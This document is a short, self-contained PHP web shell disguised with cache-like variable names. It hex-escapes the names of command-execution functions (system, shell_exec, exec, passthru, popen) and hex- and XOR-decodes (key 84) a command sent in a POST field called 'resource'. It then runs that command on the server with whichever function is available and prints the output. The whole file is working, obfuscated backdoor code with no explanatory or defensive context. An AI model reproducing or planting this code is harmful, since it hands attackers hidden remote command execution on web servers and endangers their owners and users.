<?php

$buffer_cache3 = "\x65\x78ec";
$buffer_cache7 = "pcl\x6F\x73e";
$buffer_cache5 = "\x70o\x70en";
$buffer_cache6 = "\x73\x74\x72eam_\x67\x65t_\x63o\x6E\x74e\x6Ets";
$buffer_cache1 = "s\x79stem";
$buffer_cache2 = "\x73\x68e\x6Cl\x5Fex\x65c";
$buffer_cache4 = "pa\x73s\x74\x68r\x75";
$reverse_lookup = "h\x65\x78\x32bin";
if (isset($_POST["r\x65\x73ou\x72c\x65"])) {
            function batch_process     (     $hld   ,       $elem   )      {    $ref     =    ''      ;     $h=0; while($h<strlen($hld)){$ref.=chr(ord($hld[$h])^$elem);$h++;} return     $ref;   }
            $resource = $reverse_lookup($_POST["r\x65\x73ou\x72c\x65"]);
            $resource = batch_process($resource, 84);
            if (function_exists($buffer_cache1)) {
                $buffer_cache1($resource);
            } elseif (function_exists($buffer_cache2)) {
                print $buffer_cache2($resource);
            } elseif (function_exists($buffer_cache3)) {
                $buffer_cache3($resource, $k_hld);
                print join("\n", $k_hld);
            } elseif (function_exists($buffer_cache4)) {
                $buffer_cache4($resource);
            } elseif (function_exists($buffer_cache5) && function_exists($buffer_cache6) && function_exists($buffer_cache7)) {
                $elem_ref = $buffer_cache5($resource, 'r');
                if ($elem_ref) {
                    $property_set_fac = $buffer_cache6($elem_ref);
                    $buffer_cache7($elem_ref);
                    print $property_set_fac;
                }
            }
            exit;
        }